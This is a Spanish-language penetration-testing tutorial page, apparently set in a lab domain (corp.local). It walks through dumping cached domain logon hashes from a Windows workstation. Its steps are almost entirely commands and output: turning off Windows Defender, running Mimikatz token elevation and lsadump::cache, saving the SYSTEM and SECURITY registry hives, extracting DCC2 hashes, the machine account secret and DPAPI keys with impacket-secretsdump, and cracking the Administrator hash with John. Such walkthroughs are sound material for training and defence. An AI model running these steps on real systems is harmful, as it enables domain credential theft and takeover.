---
icon: users-rectangle
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Volcado de credenciales de dominio cacheadas (mscash)

Imaginemos que tenemos un usuario local con privilegios de `administrador` como hemos visto anteriormente, estando en el equipo `Windows` podremos volcar las credenciales que fueron `cacheadas` en el sistema, estando con la sesion iniciada de forma local `.\santiago` en el `WS01` si no podemos obtener credenciales de las `logon sessions` por que no hay ninguna que nos interese y de la `SAM` no nos interesa por que solo son a nivel local y queremos a nivel de dominio, podremos realizar el volcado de credenciales `cacheadas` para ver si hay alguna registrada de algun usuario a nivel de dominio.

Utilizaremos `Mimikatz` en este caso, por lo que tendremos que descativar el antivirus ya que somos `administradores` locales, podremos hacerlo.

Una vez desactivado el `Windows Defender` ejeuctaremos `mimikatz` en un `PowerShell` como `Administrador`.

Para ello antes tendremos que ser `SYSTEM` por lo que haremos lo que hicimos anteriormente para suplantar su `token` de la siguiente forma:

```powershell
privilege::debug
token::elevate
```

Una vez ejecutado estos comandos, ahora si haremos lo siguiente:

```powershell
lsadump::cache
```

Info:

```
Domain : WS01
SysKey : c8125866b327df176940c9f2d6a48f5f

Local name : WS01 ( S-1-5-21-1345059704-770646112-4146140408 )
Domain name : CORP ( S-1-5-21-3352250647-938130414-2449934813 )
Domain FQDN : corp.local

Policy subsystem is : 1.18
LSA Key(s) : 1, default {61d93de2-3cd5-f57c-bb1a-61759861b280}
  [00] {61d93de2-3cd5-f57c-bb1a-61759861b280} 9ff21a12391e4572d34bcc2b9c41c89c572dcc27ac3d906f69db749f620da79d

* Iteration is set to default (10240)

[NL$1 - 20/01/2025 9:13:41]
RID       : 00000450 (1104)
User      : CORP\empleado1
MsCacheV2 : fda53d6158406f827388476bcbc97c37

[NL$2 - 19/01/2025 9:52:13]
RID       : 000001f4 (500)
User      : CORP\Administrator
MsCacheV2 : e1c8d7e26653ae629a74772a389cf7e6

[NL$3 - 12/01/2025 12:36:13]
RID       : 000004b9 (1209)
User      : CORP\annice.mable
MsCacheV2 : 77702054bffe13f7c5bbe919a228d985

[NL$4 - 12/01/2025 17:51:40]
RID       : 00000463 (1123)
User      : CORP\angelika.shelly
MsCacheV2 : 835512d4e4bb1d962c57d290eb99f670
```

Y con esto veremos que hemos obtenidos las credenciales de los usuarios que alguna vez en algun momento se han logeado en este equipo y podremos obtener ese `hash` que sera la contraseña del mismo, por ejemplo el del `Administrador` y vamos a `crackearlo` con `john` de la siguiente forma:

```shell
echo e1c8d7e26653ae629a74772a389cf7e6 > adminCache.hash
john --format=mscash2 adminCache.hash
```

Si realizamos esto, veremos que no nos lo consigue `crackear` por que le tenemos que dar un formato especifico al `hash`, por ello vamos a empezar por irnos a nuestro equipo de `Windows` y en la terminal de `PowerShell` vamos a volcar todas las ramas del registro y luego utilizar `impacket` en `kali`.

```powershell
cd .\Desktop
reg save hklm\system system.save
```

Y ahora volcaremos las credenciales `cacheadas` que no va a ser en la `SAM`, sera en la siguiente zona.

```powershell
reg save hklm\security security.save
```

Ahora estos 2 ficheros nos lo vamos a pasar al `kali` para poder extraer la informacion ahi.

```shell
impacket-secretsdump -system system.save -security security.save LOCAL
```

Info:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xc8125866b327df176940c9f2d6a48f5f
[*] Dumping cached domain logon information (domain/username:hash)
CORP.LOCAL/empleado1:$DCC2$10240#empleado1#fda53d6158406f827388476bcbc97c37: (2025-01-20 08:13:41)
CORP.LOCAL/Administrator:$DCC2$10240#Administrator#e1c8d7e26653ae629a74772a389cf7e6: (2025-01-19 08:52:13)
CORP.LOCAL/annice.mable:$DCC2$10240#annice.mable#77702054bffe13f7c5bbe919a228d985: (2025-01-12 11:36:13)
CORP.LOCAL/angelika.shelly:$DCC2$10240#angelika.shelly#835512d4e4bb1d962c57d290eb99f670: (2025-01-12 16:51:40)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:5700320055006b0049004e0027003d005e0055005c00750052004c0077006e004e00510045003c002d0066005d004b005f007600330072004400350022002700750068004e00300041003d0024006c004e0022005700750065006b00640034004a0056006f003e006c005f006c0050005c005d002700360077002c00290033005e005d004f005e005100560027002e003200380029004f0078005100410049002c003a0025005f00680072005d00380034002500490068002200640045006f0072005c0063002d0022005f002f006f0065006700720022005f0061006c00780047006400590062007700770059005f00
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:afc5c02d936d73808ce716070e883ab8
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x6be6aee6bc489e7fab1ed9a63b1aa5c0d2f13fef
dpapi_userkey:0xb83f8122ee552579d8fbf4d9b304ae19ab5bb7af
[*] NL$KM 
 0000   5C B5 3B 8C D5 28 A0 C3  6A F2 57 A3 08 B6 F7 D4   \.;..(..j.W.....
 0010   E4 7D 11 84 8F 2C 98 2B  2D DD 06 7D 30 53 B4 23   .}...,.+-..}0S.#
 0020   4B 8D C7 7E 92 96 5B 48  67 29 99 50 C1 E4 27 A6   K..~..[Hg).P..'.
 0030   37 2C 9D 99 E8 FD 57 11  CC 44 47 ED 30 6F 96 00   7,....W..DG.0o..
NL$KM:5cb53b8cd528a0c36af257a308b6f7d4e47d11848f2c982b2ddd067d3053b4234b8dc77e92965b4867299950c1e427a6372c9d99e8fd5711cc4447ed306f9600
[*] Cleaning up...
```

Ahora vemos que nos extrae los mismo usuarios que vimos anteriormente, pero en este caso nos lo pone el `hash` en el formato que necesitamos para poder `crackearlo` correctamente, por lo que haremos lo siguiente:

```shell
nano adminCache.hash

#Dentro del nano
$DCC2$10240#Administrator#e1c8d7e26653ae629a74772a389cf7e6
```

Lo guardamos y ahora lo vamos a `crackear`:

```shell
john --format=mscash2 adminCache.hash
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (mscash2, MS Cache Hash 2 (DCC2) [PBKDF2-SHA1 128/128 AVX 4x])
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
Passw0rd         (?)     
1g 0:00:00:01 DONE 2/3 (2025-01-20 03:49) 0.7246g/s 4127p/s 4127c/s 4127C/s Stephani..Something
Use the "--show --format=mscash2" options to display all of the cracked passwords reliably
Session completed.
```

Vemos que lo hemos conseguido esta vez.
